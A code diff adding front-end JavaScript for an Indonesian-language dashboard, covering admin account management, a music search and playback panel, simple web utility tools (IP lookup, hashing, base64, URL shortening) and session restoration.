+  const wrap = document.getElementById('adminFormWrap');
+  const card = document.getElementById('adminCard');
+  wrap.classList.toggle('open', adminState.open);
+  card.classList.toggle('expanded', adminState.open);
+  if(adminState.open) renderAdminForm();
+}
+function renderAdminForm(){
+  const inner = document.getElementById('adminFormInner');
+  if(!canAccessAdminPage(state.role)){
+    inner.innerHTML = `<div class="admin-locked"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="lock-title">AKSES DITOLAK</div><div class="lock-msg">Role <strong>${escapeHtml(state.role || 'MEMBER')}</strong> tidak punya izin.</div></div>`;
+    return;
+  }
+  const manageableRoles = getManageableRoles(state.role);
+  if(manageableRoles.length === 0){
+    inner.innerHTML = `<div class="admin-locked"><div class="lock-icon"><i class="fas fa-info"></i></div><div class="lock-title">TIDAK ADA ROLE</div><div class="lock-msg">Tidak ada role bawahan.</div></div>`;
+    return;
+  }
+  if(adminState.role && !manageableRoles.includes(adminState.role)) adminState.role = '';
+  const roleLabel = adminState.role || 'Pilih Role…';
+  const expLabel = adminState.expired || 'Pilih Durasi…';
+  inner.innerHTML = `
+    <div class="admin-section-head"><div class="bar"></div><div class="ttl">Buat / Update Akun</div></div>
+    <div class="admin-note" style="margin-top:0;margin-bottom:16px;"><strong>ROLE ANDA:</strong> ${escapeHtml(state.role)}<br>Anda dapat mengatur <strong>${manageableRoles.length}</strong> role di bawah.</div>
+    <label class="admin-label">USERNAME TARGET <span class="req">*</span></label>
+    <div class="pwd-field" style="margin-bottom:14px;"><div class="neo-field"><i class="fas fa-user"></i><input type="text" id="admin-target-user" placeholder="Username target" autocomplete="off" value="${escapeHtml(adminState.targetUsername || '')}" oninput="adminState.targetUsername = this.value"></div></div>
+    <label class="admin-label">PASSWORD <span class="req">*</span></label>
+    <div class="pwd-field" style="margin-bottom:14px;"><div class="neo-field"><i class="fas fa-key"></i><input type="password" id="admin-target-pass" placeholder="Password" autocomplete="new-password" value="${escapeHtml(adminState.targetPassword || '')}" oninput="adminState.targetPassword = this.value"><button class="toggle-pass" type="button" onclick="pwdToggle('admin-target-pass', this)"><i class="fas fa-eye"></i></button></div></div>
+    <label class="admin-label" style="margin-top:14px;">ROLE TARGET <span class="req">*</span></label>
+    <div class="neo-select" id="adminRoleSelect">
+      <div class="neo-select-trigger" id="adminRoleTrigger" onclick="toggleRolePicker(event)"><span id="adminRoleLabel">${escapeHtml(roleLabel)}</span><i class="fas fa-chevron-down arrow"></i></div>
+      <div class="neo-select-panel" id="adminRolePanel"><div class="neo-select-list">${manageableRoles.map(r => `<div class="neo-select-item ${adminState.role === r ? 'selected' : ''}" onclick="pickRole('${escapeHtml(r)}')"><span>${escapeHtml(r)}</span>${isBlockedRole(r) ? '<span class="badge blocked">NO ADMIN</span>' : ''}</div>`).join('')}</div></div>
+    </div>
+    <div id="adminRoleResult"></div>
+    <label class="admin-label" style="margin-top:14px;">EXPIRED <span class="req">*</span></label>
+    <div class="neo-select" id="adminExpiredSelect">
+      <div class="neo-select-trigger" id="adminExpiredTrigger" onclick="toggleExpiredPicker(event)"><span id="adminExpiredLabel">${escapeHtml(expLabel)}</span><i class="fas fa-chevron-down arrow"></i></div>
+      <div class="neo-select-panel" id="adminExpiredPanel"><div class="neo-select-list">${ADMIN_EXPIRED.map(e => `<div class="neo-select-item ${adminState.expired === e ? 'selected' : ''}" onclick="pickExpired('${escapeHtml(e)}')"><span>${escapeHtml(e)}</span></div>`).join('')}</div></div>
+    </div>
+    <div id="adminExpiredResult"></div>
+    <button class="admin-submit-btn" id="adminSubmitBtn" onclick="submitAdminApply()"><i class="fas fa-user-plus"></i><span>BUAT / UPDATE AKUN</span></button>
+    <div class="admin-note"><strong>INFO:</strong> Role MEMBER & FULLUP tidak dapat akses admin.</div>
+    <div class="admin-user-list" id="adminUserList"></div>
+  `;
+  if(adminState.role) renderRoleResult();
+  if(adminState.expired) renderExpiredResult();
+  renderUserList();
+}
+function renderUserList(){
+  const box = document.getElementById('adminUserList');
+  if(!box) return;
+  box.innerHTML = `<div class="admin-user-list-head"><div class="admin-user-list-title">DAFTAR USER</div><div class="admin-user-count">...</div></div><div class="admin-user-empty">Memuat…</div>`;
+  fetch(`${SERVER_BASE}/api/admin/users?sessionKey=${encodeURIComponent(state.sessionKey)}`)
+    .then(r => r.json())
+    .then(data => {
+      const users = (data && data.users) || [];
+      box.innerHTML = `
+        <div class="admin-user-list-head"><div class="admin-user-list-title">DAFTAR USER (SERVER)</div><div class="admin-user-count">${users.length}</div></div>
+        ${users.length === 0 ? `<div class="admin-user-empty">Belum ada user.</div>` : users.map(u => {
+          const daysLeft = _daysLeft(u.expiredDate);
+          const isPerm = u.expiredDate === '9999-99-99';
+          let statusClass = 'active', statusText = '';
+          if(isPerm){ statusClass='permanent'; statusText='PERMANEN'; }
+          else if(daysLeft<=0){ statusClass='expired'; statusText='EXPIRED'; }
+          else if(daysLeft<=1){ statusClass='warning'; statusText=`${daysLeft} HARI`; }
+          else { statusClass='active'; statusText=`${daysLeft} HARI`; }
+          return `<div class="admin-user-item"><div class="admin-user-info"><div class="admin-user-name">${escapeHtml(u.username)}</div><div class="admin-user-meta"><span class="admin-user-role">${escapeHtml(u.role)}</span>${escapeHtml(u.expiredLabel || u.expiredDate || '—')}<span class="admin-user-status ${statusClass}"><i class="fas fa-clock"></i> ${statusText}</span></div></div><div class="admin-user-del" onclick="deleteUserServer('${escapeHtml(u.username)}')"><i class="fas fa-trash"></i></div></div>`;
+        }).join('')}
+      `;
+    })
+    .catch(() => { box.innerHTML = `<div class="admin-user-empty">Gagal memuat.</div>`; });
+}
+async function deleteUserServer(username){
+  if(!confirm(`Hapus user "${username}" dari server?`)) return;
+  try {
+    const res = await fetch(`${SERVER_BASE}/api/admin/user/${encodeURIComponent(username)}?sessionKey=${encodeURIComponent(state.sessionKey)}`, { method: 'DELETE' });
+    const d = await res.json();
+    if(d.success){ showToast(`User ${username} dihapus`, 'success'); renderUserList(); }
+    else showToast(d.message || 'Gagal hapus', 'error');
+  } catch(e){ showToast('Koneksi error', 'error'); }
+}
+function toggleRolePicker(ev){
+  ev?.stopPropagation();
+  adminState.rolePickerOpen = !adminState.rolePickerOpen;
+  adminState.expiredPickerOpen = false;
+  document.getElementById('adminRolePanel')?.classList.toggle('open', adminState.rolePickerOpen);
+  document.getElementById('adminRoleTrigger')?.classList.toggle('open', adminState.rolePickerOpen);
+  document.getElementById('adminExpiredPanel')?.classList.remove('open');
+  document.getElementById('adminExpiredTrigger')?.classList.remove('open');
+}
+function toggleExpiredPicker(ev){
+  ev?.stopPropagation();
+  adminState.expiredPickerOpen = !adminState.expiredPickerOpen;
+  adminState.rolePickerOpen = false;
+  document.getElementById('adminExpiredPanel')?.classList.toggle('open', adminState.expiredPickerOpen);
+  document.getElementById('adminExpiredTrigger')?.classList.toggle('open', adminState.expiredPickerOpen);
+  document.getElementById('adminRolePanel')?.classList.remove('open');
+  document.getElementById('adminRoleTrigger')?.classList.remove('open');
+}
+function pickRole(role){
+  if(!canManageRole(state.role, role)){ showResultDialog('Gagal',`Tidak berwenang role ${role}.`, false); return; }
+  adminState.role = role;
+  adminState.rolePickerOpen = false;
+  document.getElementById('adminRoleLabel').textContent = role;
+  document.getElementById('adminRolePanel')?.classList.remove('open');
+  document.getElementById('adminRoleTrigger')?.classList.remove('open');
+  document.querySelectorAll('#adminRolePanel .neo-select-item').forEach(el => { el.classList.toggle('selected', (el.querySelector('span')?.textContent?.trim() || '') === role); });
+  renderRoleResult();
+}
+function pickExpired(exp){
+  adminState.expired = exp;
+  adminState.expiredPickerOpen = false;
+  document.getElementById('adminExpiredLabel').textContent = exp;
+  document.getElementById('adminExpiredPanel')?.classList.remove('open');
+  document.getElementById('adminExpiredTrigger')?.classList.remove('open');
+  document.querySelectorAll('#adminExpiredPanel .neo-select-item').forEach(el => { el.classList.toggle('selected', el.textContent.trim() === exp); });
+  renderExpiredResult();
+}
+function renderRoleResult(){
+  const box = document.getElementById('adminRoleResult');
+  if(!box || !adminState.role) return;
+  const blocked = isBlockedRole(adminState.role);
+  const badge = blocked ? '<span class="admin-access-badge denied"><i class="fas fa-ban"></i> NO ADMIN</span>' : '<span class="admin-access-badge granted"><i class="fas fa-check"></i> VALID</span>';
+  box.innerHTML = `<div class="admin-result-box"><div class="admin-result-lbl">ROLE TARGET</div><div class="admin-result-val ${blocked ? 'red' : 'gold'}">${escapeHtml(adminState.role)}</div>${badge}</div>`;
+}
+function renderExpiredResult(){
+  const box = document.getElementById('adminExpiredResult');
+  if(!box || !adminState.expired) return;
+  const isPermanent = adminState.expired === 'PERMANEN';
+  box.innerHTML = `<div class="admin-result-box"><div class="admin-result-lbl">DURASI EXPIRED</div><div class="admin-result-val ${isPermanent ? 'green' : 'blue'}">${escapeHtml(adminState.expired)}</div><div class="admin-result-lbl" style="margin-top:8px;">TANGGAL</div><div style="font-family:'Space Mono',monospace;font-size:12px;font-weight:700;">${escapeHtml(_calcExpiredDate(adminState.expired))}</div></div>`;
+}
+async function submitAdminApply(){
+  const targetUser = (document.getElementById('admin-target-user')?.value || '').trim();
+  const targetPass = (document.getElementById('admin-target-pass')?.value || '').trim();
+  if(!targetUser || !targetPass){ showResultDialog('Gagal','Username & password wajib.', false); return; }
+  if(!adminState.role || !adminState.expired){ showResultDialog('Gagal','Role & expired wajib.', false); return; }
+  if(!canManageRole(state.role, adminState.role)){ showResultDialog('Gagal',`Tidak berwenang role ${adminState.role}.`, false); return; }
+  const btn = document.getElementById('adminSubmitBtn');
+  const originalHTML = btn.innerHTML;
+  btn.disabled = true;
+  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>MEMPROSES...</span>';
+  try{
+    const res = await fetch(`${SERVER_BASE}/api/admin/apply`, {
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body: new URLSearchParams({ username: targetUser, password: targetPass, role: adminState.role, expired: adminState.expired, sessionKey: state.sessionKey, adminBy: state.username }).toString(),
+    });
+    const data = await res.json();
+    if(data.success === true){
+      showResultDialog('Berhasil',`Akun dibuat!\n\nUsername: ${targetUser}\nRole: ${adminState.role}\nExpired: ${adminState.expired}`, true);
+      _resetAdminForm();
+      renderUserList();
+    } else {
+      showResultDialog('Gagal', data.message || 'Gagal.', false);
+    }
+  } catch(e){ showResultDialog('Gagal','Koneksi error.', false); }
+  btn.disabled = false;
+  btn.innerHTML = originalHTML;
+}
+function _resetAdminForm(){
+  adminState.targetUsername = '';
+  adminState.targetPassword = '';
+  adminState.role = '';
+  adminState.expired = '';
+  const uEl = document.getElementById('admin-target-user');
+  const pEl = document.getElementById('admin-target-pass');
+  const rEl = document.getElementById('adminRoleLabel');
+  const eEl = document.getElementById('adminExpiredLabel');
+  if(uEl) uEl.value = '';
+  if(pEl) pEl.value = '';
+  if(rEl) rEl.textContent = 'Pilih Role…';
+  if(eEl) eEl.textContent = 'Pilih Durasi…';
+  document.getElementById('adminRoleResult').innerHTML = '';
+  document.getElementById('adminExpiredResult').innerHTML = '';
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MUSIC (SERVER PROXY)
+   ═══════════════════════════════════════════════════════════ */
+const MUSIC_API_SEARCH = `${SERVER_BASE}/api/music/search`;
+const MUSIC_API_AUDIO = `${SERVER_BASE}/api/music/audio`;
+
+function _initMusicAudio(){
+  if(musicAudio) return;
+  musicAudio = new Audio();
+  musicAudio.volume = musicState.volume;
+  musicAudio.addEventListener('timeupdate', _musicUpdateProgress);
+  musicAudio.addEventListener('loadedmetadata', _musicUpdateDuration);
+  musicAudio.addEventListener('ended', _musicOnEnded);
+  musicAudio.addEventListener('play', () => { musicState.isPlaying = true; _musicUpdatePlayIcon(); document.getElementById('music-cover')?.classList.add('spinning'); });
+  musicAudio.addEventListener('pause', () => { musicState.isPlaying = false; _musicUpdatePlayIcon(); document.getElementById('music-cover')?.classList.remove('spinning'); });
+}
+function toggleMusicPlayer(){
+  musicState.open = !musicState.open;
+  const wrap = document.getElementById('musicWrap');
+  const card = document.getElementById('musicCard');
+  wrap.classList.toggle('open', musicState.open);
+  card.classList.toggle('expanded', musicState.open);
+  if(musicState.open){ _initMusicAudio(); _musicRenderList(); }
+}
+function musicSetTab(tab){
+  musicState.tab = tab;
+  document.querySelectorAll('.music-tab').forEach(el => { el.classList.toggle('active', el.dataset.tab === tab); });
+  _musicRenderList();
+}
+async function musicSearch(){
+  const q = document.getElementById('music-search-input').value.trim();
+  if(!q) return;
+  _musicLoading(true);
+  try{
+    const res = await fetch(`${MUSIC_API_SEARCH}?q=${encodeURIComponent(q)}`);
+    const json = await res.json();
+    const data = json?.data || [];
+    musicState.results = data.map(item => ({
+      id: item.videoId || '', title: item.title || 'Unknown',
+      artist: (item.author && typeof item.author === 'object' ? item.author.name : item.author) || 'Unknown',
+      duration: item.duration?.timestamp || item.timestamp || '0:00',
+      thumb: item.image || item.thumbnail || '',
+      url: item.url || `https://youtube.com/watch?v=${item.videoId}`,
+    })).filter(x => x.id && x.url);
+    musicSetTab('results');
+  } catch(e){ showToast('Gagal cari musik', 'error'); }
+  _musicLoading(false);
+}
+function _musicRenderList(){
+  const box = document.getElementById('music-list');
+  if(!box) return;
+  let items = [];
+  if(musicState.tab === 'results') items = musicState.results;
+  else if(musicState.tab === 'playlist') items = musicState.playlist;
+  else if(musicState.tab === 'favorites') items = musicState.favorites;
+  if(!items.length){
+    box.innerHTML = `<div class="music-empty"><i class="fas fa-music"></i><p>${musicState.tab === 'results' ? 'Cari lagu dulu' : musicState.tab === 'playlist' ? 'Playlist kosong' : 'Belum ada favorit'}</p></div>`;
+    return;
+  }
+  box.innerHTML = items.map((item, idx) => {
+    const playing = musicState.currentIndex === idx && musicState.isPlaying;
+    const isFav = musicState.favorites.some(f => f.id === item.id);
+    return `<div class="music-item ${playing ? 'playing' : ''}" onclick="musicPlayIndex(${idx})"><div class="music-item-thumb">${item.thumb ? `<img src="${escapeHtml(item.thumb)}">` : '<i class="fas fa-music"></i>'}</div><div class="music-item-info"><div class="music-item-title">${escapeHtml(item.title)}</div><div class="music-item-artist">${escapeHtml(item.artist)}</div></div><div class="music-item-dur">${escapeHtml(item.duration)}</div><div class="music-item-actions"><div class="music-item-action fav ${isFav ? 'active' : ''}" onclick="event.stopPropagation();musicToggleFavorite(${idx})"><i class="fas fa-heart"></i></div><div class="music-item-action dl" onclick="event.stopPropagation();musicAddToPlaylist(${idx})"><i class="fas fa-plus"></i></div></div></div>`;
+  }).join('');
+}
+function _musicLoading(on){
+  const box = document.getElementById('music-list');
+  if(!box) return;
+  if(on) box.innerHTML = `<div class="music-loading"><i class="fas fa-spinner fa-spin"></i> Mencari…</div>`;
+}
+async function musicPlayIndex(idx){
+  let items = musicState.tab === 'results' ? musicState.results : musicState.tab === 'playlist' ? musicState.playlist : musicState.favorites;
+  const track = items[idx];
+  if(!track) return;
+  if(musicState.tab !== 'playlist'){
+    if(!musicState.playlist.some(p => p.id === track.id)) musicState.playlist.push(track);
+    musicState.currentIndex = musicState.playlist.findIndex(p => p.id === track.id);
+  } else { musicState.currentIndex = idx; }
+  await _musicPlayTrack(track);
+  _musicRenderList();
+}
+async function _musicPlayTrack(track){
+  _initMusicAudio();
+  document.getElementById('music-title').textContent = track.title;
+  document.getElementById('music-artist').textContent = track.artist;
+  const cover = document.getElementById('music-cover');
+  if(track.thumb) cover.innerHTML = `<img src="${escapeHtml(track.thumb)}">`;
+  else cover.innerHTML = '<i class="fas fa-music"></i>';
+  showToast('Memuat audio…');
+  try{
+    const res = await fetch(`${MUSIC_API_AUDIO}?url=${encodeURIComponent(track.url)}`);
+    const json = await res.json();
+    const medias = json?.data?.medias || json?.result?.medias || [];
+    const audio = medias.find(m => m.is_audio === true) || medias[0];
+    if(audio?.url){
+      musicAudio.src = audio.url;
+      await musicAudio.play();
+      showToast('▶️ ' + track.title);
+      return;
+    }
+  } catch(e){}
+  showToast('⚠️ Audio tidak tersedia', 'error');
+}
+function musicTogglePlay(){
+  if(!musicAudio || !musicAudio.src){ showToast('Pilih lagu dulu', 'error'); return; }
+  if(musicAudio.paused) musicAudio.play(); else musicAudio.pause();
+}
+function musicNext(){
+  if(!musicState.playlist.length) return;
+  let next;
+  if(musicState.shuffle){
+    do { next = Math.floor(Math.random() * musicState.playlist.length); }
+    while(next === musicState.currentIndex && musicState.playlist.length > 1);
+  } else { next = (musicState.currentIndex + 1) % musicState.playlist.length; }
+  musicState.currentIndex = next;
+  _musicPlayTrack(musicState.playlist[next]);
+  _musicRenderList();
+}
+function musicPrev(){
+  if(!musicState.playlist.length) return;
+  const prev = musicState.currentIndex <= 0 ? musicState.playlist.length - 1 : musicState.currentIndex - 1;
+  musicState.currentIndex = prev;
+  _musicPlayTrack(musicState.playlist[prev]);
+  _musicRenderList();
+}
+function musicToggleShuffle(){
+  musicState.shuffle = !musicState.shuffle;
+  document.getElementById('music-shuffle')?.classList.toggle('active', musicState.shuffle);
+  showToast(musicState.shuffle ? 'Shuffle ON' : 'Shuffle OFF');
+}
+function musicToggleRepeat(){
+  musicState.repeat = !musicState.repeat;
+  document.getElementById('music-repeat')?.classList.toggle('active', musicState.repeat);
+  showToast(musicState.repeat ? 'Repeat ON' : 'Repeat OFF');
+}
+function musicSetVolume(val){
+  const v = parseInt(val) / 100;
+  musicState.volume = v;
+  if(musicAudio) musicAudio.volume = v;
+  const lbl = document.getElementById('music-volume-label');
+  if(lbl) lbl.textContent = val + '%';
+}
+function musicSeekClick(ev){
+  if(!musicAudio || !musicAudio.duration) return;
+  const bar = ev.currentTarget;
+  const rect = bar.getBoundingClientRect();
+  musicAudio.currentTime = ((ev.clientX - rect.left) / rect.width) * musicAudio.duration;
+}
+function _musicUpdateProgress(){
+  if(!musicAudio || !musicAudio.duration) return;
+  const pct = (musicAudio.currentTime / musicAudio.duration) * 100;
+  const fill = document.getElementById('music-progress-fill');
+  if(fill) fill.style.width = pct + '%';
+  const ct = document.getElementById('music-current-time');
+  if(ct) ct.textContent = _musicFmt(musicAudio.currentTime);
+}
+function _musicUpdateDuration(){
+  if(!musicAudio) return;
+  const tt = document.getElementById('music-total-time');
+  if(tt) tt.textContent = _musicFmt(musicAudio.duration);
+}
+function _musicUpdatePlayIcon(){
+  const icon = document.getElementById('music-play-icon');
+  if(!icon) return;
+  icon.className = musicState.isPlaying ? 'fas fa-pause' : 'fas fa-play';
+}
+function _musicOnEnded(){
+  if(musicState.repeat){ musicAudio.currentTime = 0; musicAudio.play(); }
+  else { musicNext(); }
+}
+function _musicFmt(sec){
+  if(!sec || isNaN(sec)) return '0:00';
+  return `${Math.floor(sec / 60)}:${Math.floor(sec % 60).toString().padStart(2,'0')}`;
+}
+function musicToggleFavorite(idx){
+  let items = musicState.tab === 'results' ? musicState.results : musicState.tab === 'playlist' ? musicState.playlist : musicState.favorites;
+  const track = items[idx];
+  if(!track) return;
+  const i = musicState.favorites.findIndex(f => f.id === track.id);
+  if(i >= 0){ musicState.favorites.splice(i, 1); showToast('Dihapus dari favorit'); }
+  else { musicState.favorites.push(track); showToast('Ditambah ke favorit'); }
+  _musicRenderList();
+}
+function musicAddToPlaylist(idx){
+  let items = musicState.tab === 'results' ? musicState.results : musicState.tab === 'playlist' ? musicState.playlist : musicState.favorites;
+  const track = items[idx];
+  if(!track) return;
+  if(musicState.playlist.some(p => p.id === track.id)){ showToast('Sudah ada di playlist'); return; }
+  musicState.playlist.push(track);
+  showToast('Ditambah ke playlist');
+  _musicRenderList();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   TOOLS (SERVER BACKEND)
+   ═══════════════════════════════════════════════════════════ */
+const TOOL_CONFIG = {
+  tool_ip_lookup: { title:'IP LOOKUP', label:'IP ADDRESS', placeholder:'8.8.8.8', endpoint:'/api/tools/ip-lookup', param:'ip' },
+  tool_domain_info: { title:'DOMAIN INFO', label:'DOMAIN', placeholder:'google.com', endpoint:'/api/tools/domain-info', param:'domain' },
+  tool_short_url: { title:'SHORT URL', label:'URL PANJANG', placeholder:'https://example.com', endpoint:'/api/tools/short-url', param:'url' },
+  tool_base64: { title:'BASE64', label:'TEXT', placeholder:'Hello World', endpoint:'/api/tools/base64', param:'text', isPost:true, hasMode:true },
+  tool_hash: { title:'HASH GENERATOR', label:'TEXT', placeholder:'Hello World', endpoint:'/api/tools/hash', param:'text' },
+};
+
+function toggleToolsForm(){
+  toolsState.open = !toolsState.open;
+  const wrap = document.getElementById('toolsWrap');
+  const card = document.getElementById('toolsCard');
+  wrap.classList.toggle('open', toolsState.open);
+  card.classList.toggle('expanded', toolsState.open);
+  if(toolsState.open) renderToolsGrid();
+}
+function renderToolsGrid(){
+  const grid = document.getElementById('toolsGrid');
+  if(!grid) return;
+  grid.innerHTML = TOOLS_CATEGORIES.map(cat => `
+    <div class="tool-cat-card ${toolsState.openCat === cat.id ? 'open' : ''}" onclick="toggleToolCategory('${cat.id}', event)">
+      <div class="tool-cat-icon ${cat.color}"><i class="fas ${cat.icon}"></i></div>
+      <div class="tool-cat-title">${escapeHtml(cat.title)}</div>
+      <div class="tool-cat-sub">${escapeHtml(cat.subtitle)}</div>
+    </div>
+  `).join('');
+  const countEl = document.getElementById('tools-count');
+  if(countEl) countEl.textContent = `${TOOLS_CATEGORIES.length} item`;
+}
+function toggleToolCategory(id, ev){
+  if(ev) ev.stopPropagation();
+  toolsState.openCat = toolsState.openCat === id ? null : id;
+  renderToolsGrid();
+  renderToolsSub();
+}
+function renderToolsSub(){
+  const container = document.getElementById('toolsSubContainer');
+  if(!container) return;
+  if(!toolsState.openCat){ container.innerHTML = ''; return; }
+  const cat = TOOLS_CATEGORIES.find(c => c.id === toolsState.openCat);
+  if(!cat){ container.innerHTML = ''; return; }
+  container.innerHTML = `<div class="tool-sub-wrap open"><div class="tool-sub-inner"><div class="tool-sub-head"><div class="ttl">${escapeHtml(cat.title)}</div></div>${cat.items.map((item, idx) => {
+    const isSoon = item.soon === true;
+    return `<div class="tool-item ${isSoon ? 'soon' : ''}" onclick="${isSoon ? `showToast('${escapeHtml(item.label)} — coming soon')` : `openToolItem('${cat.id}', ${idx})`}"><div class="tool-item-icon"><i class="fas ${item.icon}"></i></div><div class="tool-item-info"><div class="tool-item-label">${escapeHtml(item.label)}</div><div class="tool-item-sub">${escapeHtml(item.sub || '')}</div></div>${isSoon ? `<span class="tool-item-badge">SOON</span>` : `<div class="tool-item-arrow"><i class="fas fa-arrow-right"></i></div>`}</div>`;
+  }).join('')}</div></div>`;
+}
+function openToolItem(catId, idx){
+  const cat = TOOLS_CATEGORIES.find(c => c.id === catId);
+  if(!cat) return;
+  const item = cat.items[idx];
+  if(!item) return;
+  if(item.cmd){ openToolModal(item.cmd); return; }
+  if(item.url && item.url !== '#'){ window.open(item.url, '_blank'); return; }
+  showToast(`${item.label} — belum tersedia`, 'error');
+}
+function openToolModal(toolCmd){
+  const cfg = TOOL_CONFIG[toolCmd];
+  if(!cfg) return;
+  currentTool = toolCmd;
+  document.getElementById('toolModalTitle').textContent = cfg.title;
+  document.getElementById('toolInputLabel').textContent = cfg.label;
+  document.getElementById('toolInput').placeholder = cfg.placeholder;
+  document.getElementById('toolInput').value = '';
+  document.getElementById('toolResult').style.display = 'none';
+  document.getElementById('toolModeField').style.display = cfg.hasMode ? 'block' : 'none';
+  openModal('modalTool');
+}
+async function runTool(){
+  if(!currentTool) return;
+  const cfg = TOOL_CONFIG[currentTool];
+  const input = document.getElementById('toolInput').value.trim();
+  if(!input){ showToast('Input kosong', 'error'); return; }
+  const btn = document.getElementById('toolRunBtn');
+  const orig = btn.innerHTML;
+  btn.disabled = true;
+  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> MEMPROSES…';
+  try {
+    let url, options;
+    if(cfg.isPost){
+      url = `${SERVER_BASE}${cfg.endpoint}`;
+      options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ [cfg.param]: input, mode: document.getElementById('toolMode').value }) };
+    } else {
+      url = `${SERVER_BASE}${cfg.endpoint}?${cfg.param}=${encodeURIComponent(input)}`;
+      options = { method: 'GET' };
+    }
+    const res = await fetch(url, options);
+    const data = await res.json();
+    const box = document.getElementById('toolResult');
+    box.style.display = 'block';
+    box.style.background = '#F0FDF4';
+    box.style.borderColor = 'var(--green)';
+    if(data.success){
+      if(currentTool === 'tool_short_url'){
+        box.innerHTML = `<strong>Short URL:</strong><br><a href="${data.shortUrl}" target="_blank">${data.shortUrl}</a>`;
+      } else if(currentTool === 'tool_base64'){
+        box.innerHTML = `<strong>Hasil:</strong><br>${escapeHtml(data.result)}`;
+      } else if(currentTool === 'tool_hash'){
+        box.innerHTML = `<strong>${data.algo.toUpperCase()}:</strong><br>${data.hash}`;
+      } else {
+        box.innerHTML = `<strong>Hasil:</strong><br><pre style="white-space:pre-wrap;margin:0;">${JSON.stringify(data.data, null, 2)}</pre>`;
+      }
+    } else {
+      box.style.background = '#FEF2F2';
+      box.style.borderColor = 'var(--red)';
+      box.innerHTML = `<strong>Error:</strong> ${escapeHtml(data.message || 'Gagal')}`;
+    }
+  } catch(e){ showToast('Koneksi error', 'error'); }
+  btn.disabled = false;
+  btn.innerHTML = orig;
+}
+
+/* ═══════════════════════════════════════════════════════════
+   UTIL
+   ═══════════════════════════════════════════════════════════ */
+function escapeHtml(str){ if(str == null) return ''; return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function showToast(msg, type){
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.style.borderColor = type === 'error' ? '#EF4444' : type === 'success' ? '#22C55E' : '#FACC15';
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2200);
+}
+function showResultDialog(title, msg, success){
+  const back = document.getElementById('resultDialog');
+  const box = document.getElementById('resultDialogBox');
+  const icon = document.getElementById('resultIcon');
+  document.getElementById('resultTitle').textContent = title;
+  document.getElementById('resultMsg').textContent = msg;
+  icon.innerHTML = success ? '<i class="fas fa-check"></i>' : '<i class="fas fa-times"></i>';
+  box.classList.remove('success','error');
+  box.classList.add(success ? 'success' : 'error');
+  back.classList.add('show');
+}
+function closeResultDialog(){ document.getElementById('resultDialog')?.classList.remove('show'); }
+
+/* ═══════════════════════════════════════════════════════════
+   INIT
+   ═══════════════════════════════════════════════════════════ */
+async function restoreLoginSession(){
+  const savedKey = localStorage.getItem('sessionKey') || '';
+  if(!savedKey){ goTo('landing'); return; }
+  try {
+    const res = await fetch(`${SERVER_BASE}/session?sessionKey=${encodeURIComponent(savedKey)}`);
+    const data = await res.json();
+    if(data.success === true || data.valid === true){
+      state.username = data.username || localStorage.getItem('username') || '';
+      state.password = '';
+      state.role = data.role || localStorage.getItem('role') || 'MEMBER';
+      state.expiredDate = data.expiredDate || localStorage.getItem('expiredDate') || '—';
+      state.sessionKey = data.sessionKey || savedKey;
+      localStorage.setItem('username', state.username);
+      localStorage.setItem('role', state.role);
+      localStorage.setItem('expiredDate', state.expiredDate);
+      localStorage.setItem('sessionKey', state.sessionKey);
+      goTo('dash');
+      refreshMyDeviceCode();
+    } else {
+      localStorage.removeItem('username'); localStorage.removeItem('role'); localStorage.removeItem('expiredDate'); localStorage.removeItem('sessionKey');
+      goTo('landing');
+    }
+  } catch(e){
+    // Jangan tampilkan dashboard tanpa session server yang tervalidasi.
+    goTo('landing');
+  }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  restoreLoginSession();
+
+  document.querySelectorAll('.modal-backdrop').forEach(m => {
+    m.addEventListener('click', (e) => { if (e.target === m) m.classList.remove('show'); });
+  });
+  document.getElementById('resultDialog')?.addEventListener('click', (e) => { if(e.target.id === 'resultDialog') closeResultDialog(); });
+
+  const _pwdNew = document.getElementById('pwd-new');
+  const _pwdConfirm = document.getElementById('pwd-confirm');
+  if(_pwdNew){ _pwdNew.addEventListener('input', evaluateStrength); _pwdNew.addEventListener('input', evaluateMatch); }
+  if(_pwdConfirm){ _pwdConfirm.addEventListener('input', evaluateMatch); _pwdConfirm.addEventListener('keydown', (e) => { if(e.key === 'Enter') submitChangePassword(); }); }
+
+  const _musicInput = document.getElementById('music-search-input');
+  if(_musicInput) _musicInput.addEventListener('keydown', (e) => { if(e.key === 'Enter') musicSearch(); });
+
+  const _chatInput = document.getElementById('chat-input');
+  if(_chatInput) _chatInput.addEventListener('keydown', (e) => { if(e.key === 'Enter' && !e.shiftKey){ e.preventDefault(); chatSendMessage(); } });
+
+  const _connInput = document.getElementById('connect-code-input');
+  if(_connInput){
+    _connInput.addEventListener('focus', () => _connectSetCodeState('focused'));
+    _connInput.addEventListener('blur', () => { const wrap = document.getElementById('connect-code-wrap'); if(wrap && wrap.classList.contains('focused')) wrap.classList.remove('focused'); });
+    _connInput.addEventListener('input', () => { _connectHideStatus(); _connectSetCodeState(null); });
+    _connInput.addEventListener('keydown', (e) => { if(e.key === 'Enter'){ e.preventDefault(); submitConnectCode(); } });
+  }
+
+  document.addEventListener('click', (e) => {
+    if(!e.target.closest('#adminRoleSelect')){
+      adminState.rolePickerOpen = false;
+      document.getElementById('adminRolePanel')?.classList.remove('open');
+      document.getElementById('adminRoleTrigger')?.classList.remove('open');
+    }
+    if(!e.target.closest('#adminExpiredSelect')){
+      adminState.expiredPickerOpen = false;
+      document.getElementById('adminExpiredPanel')?.classList.remove('open');
+      document.getElementById('adminExpiredTrigger')?.classList.remove('open');
+    }
+  });
+
+  renderToolsGrid();
+});
+</script>
 </body>
 </html>
